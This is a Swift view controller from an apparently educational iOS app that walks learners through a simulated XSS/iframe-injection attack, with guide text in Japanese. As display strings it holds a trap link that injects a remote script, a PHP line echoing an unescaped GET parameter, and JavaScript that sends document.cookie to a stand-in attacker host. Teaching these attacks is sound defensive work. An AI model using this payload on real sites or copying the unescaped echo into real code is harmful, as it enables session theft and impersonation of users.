import UIKit

class IFrameInjectionUnsafeWebSimulatorViewController: WebSimulatorViewController {
    
    let trapButton = A()
    let welcomeLabel = H1()
    let nameLabel = P()
    let feedbackIFrame = IFrame()
    let attackedLabel = Text()
    let sessIdLabel = Text()
    let feedbackView = WebElementContainerView()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        setupViews()
    }
    
    override func viewDidAppear(_ animated: Bool) {
        super.viewDidAppear(animated)
        showTrap()
    }
    
    private func setupViews() {
        trapButton.set(text: "このサイト本当に面白い!!")
        trapButton.set(
            code: "<a href=\"http://www.unsafe.co.jp/welcome.php?name=<script src=http://www.trap.cp.jp/iframe_injection.js></script>\">\n    このサイト本当に面白い!!\n</a>",
            language: .html
        )
        trapButton.button.addTarget(self, action: #selector(showTrapButtonDisabledMessage(_:)), for: .touchUpInside)
        welcomeLabel.set(text: "ようこそ脆弱株式会社へ")
        nameLabel.set(text: "さん")
        nameLabel.set(
            code: "<p><?php echo $_GET[\"name\"]; ?>さん</p>",
            language: .php
        )
        feedbackIFrame.set(
            code: """
var iframe = document.createElement("iframe");
iframe.setAttribute("src", "http://www.trap.co.jp/send_mail.php?cookie=" + document.cookie);
""",
            language: .javaScript
        )
        feedbackIFrame.codeLabel.positionX = .right
        feedbackIFrame.codeLabel.positionY = .top
        attackedLabel.set(text: "攻撃成功")
        sessIdLabel.set(text: "PHPSESSID=c4ad79dc6067469927e00e1adc847c78")
        sessIdLabel.set(code: "echo $cookie;", language: .php)
        feedbackIFrame.webSimulatorView = feedbackView
    }
    
    private func showTrap() {
        body.clear()
        body.append(element: trapButton)
        clearGuideSections()
        appendGuideSection([GuideText(text: "これが攻撃者が用意した罠サイトです。")])
        appendGuideSection([
            GuideText(text: "この赤枠で囲まれたリンクをタップすると脆弱なWebサイトに遷移します。\nリンクの下に表示されたコードを見てみましょう。"),
            GuideText(
                text: "脆弱なWebサイトに遷移する際、GETリクエストのnameパラメータには「<script src=http://www.trap.cp.jp/iframe_injection.js></script>」が設定されています。",
                programingLanguages: [.html]
            ),
            GuideText(text: "このnameの値をエスケープせずに直接表示することによって攻撃者のスクリプトが実行されます。"),
            ],
            onEnter: { completion in
                self.focus(on: self.trapButton) {
                    completion?()
                }
        }, onExit: { completion in
            self.unfocus(elementView: self.trapButton) {
                completion?()
            }
        })
        appendGuideSection(
            [GuideText(text: "それでは実際にこのリンクをタップして脆弱なWebサイトに遷移してみましょう。")],
            onEnter: { completion in
                self.trapButton.button.removeTarget(self, action: #selector(self.showTrapButtonDisabledMessage(_:)), for: .touchUpInside)
                self.trapButton.button.addTarget(self, action: #selector(self.handleTrapButtonToShowWelcome(_:)), for: .touchUpInside)
                completion?()
        })
        removeCloseButton()
        guideMessageCollectionView.reloadData()
        guideMessageCollectionView.scrollToItem(at: IndexPath(item: 0, section: 0), at: .left, animated: false)
        showGuideMessageCollectionView(completion: nil)
    }
    
    private func showWelcome() {
        body.clear()
        body.append(element: welcomeLabel)
        body.append(element: nameLabel)
        body.append(element: feedbackIFrame)
        feedbackView.append(element: attackedLabel)
        feedbackView.appendBreak()
        feedbackView.append(element: sessIdLabel)
        clearGuideSections()
        appendGuideSection([
            GuideText(text: "これが実際にスクリプトが埋め込まれた後の脆弱なWebサイトです。"),
            ])
        appendGuideSection([
            GuideText(
                text: "この赤枠で囲まれた<p>要素には本来<p>要素の下に示したコードでユーザの名前を表示しようとしていました。\nしかし、本来の意図とは違って実際に実行されたのは以下のコードです。\n<p><script src=\"http://www.trap.cp.jp/iframe_injection.js\"></script>さん</p>",
                programingLanguages: [.html]
            ),
            GuideText(
                text: "nameに設定された値をエスケープせずに表示した結果、\n「<p><?php echo <script src=http://www.trap.cp.jp/iframe_injection.js></script>; ?>さん</p>」というコードが実行され攻撃者の用意したスクリプトが読み込まれてしまいました。",
                programingLanguages: [.php, .html]
                )
            ],
            onEnter: { completion in
                self.focus(on: self.nameLabel) {
                    completion?()
                }
        }, onExit: { completion in
            self.unfocus(elementView: self.nameLabel) {
                completion?()
            }
        })
        appendGuideSection([
            GuideText(
                text: "この赤枠で囲まれた部分が攻撃者が埋め込んだ<iframe>要素です。\n今回は分かりやすさを狙って<iframe>要素を表示していますが、実際には攻撃者は自身が埋め込んだ<iframe>要素を表示せずに隠蔽します。",
                programingLanguages: [.html])
            ],
            onEnter: { completion in
                self.focus(on: self.feedbackIFrame) {
                    completion?()
                }
        }, onExit: { completion in
            self.unfocus(elementView: self.feedbackIFrame) {
                completion?()
            }
        })
        appendGuideSection([
                GuideText(text: "ここに攻撃者が取得したユーザのクッキーの値が表示されています。\n脆弱なWebサイトで生成したユーザのセッションIDが盗まれてしまっています。"
                ),
                GuideText(text: "セッションIDが盗まれると攻撃者がユーザになりすますことが可能となってしまいます。\nユーザになりすましてサービスを利用されてしまってはユーザが不利益を被ることになりますし、サービスへの信頼も失ってしまいます。"
                    ),
                GuideText(text: "他にもCookieからユーザの様々な個人情報が盗まれてしまうため、早急に対策する必要があります。")
                ],
                           onEnter: { completion in
                            self.focus(on: self.sessIdLabel) {
                                completion?()
                            }
        }, onExit: { completion in
            self.unfocus(elementView: self.sessIdLabel) {
                completion?()
            }
        })
        appendGuideSection([
            GuideText(text: "今回のレッスンはこれで終了です。\nこの攻撃への対策は同レッスンの対策編で解説していますのでそちらを参考にしてください。\nお疲れ様でした。")
            ])
        addCloseButton()
        guideMessageCollectionView.reloadData()
        guideMessageCollectionView.scrollToItem(at: IndexPath(item: 0, section: 0), at: .left, animated: false)
        showGuideMessageCollectionView()
    }
    
    
    @objc
    private func showTrapButtonDisabledMessage(_ sender: UIButton) {
        NotificationMessage.send(text: "全ての説明文を読むまでは次の画面に遷移できません。", axisX: .right, axisY: .center, size: nil, font: .boldSystemFont(ofSize: 18), textColor: .white, backgroundColor: .red, lifeSeconds: 2)
    }
    
    @objc
    private func handleTrapButtonToShowWelcome(_ sender: UIButton) {
        hideGuideMessageCollectionView {
            self.unfocusAll() {
                self.showWelcome()
            }
        }
    }
    
}
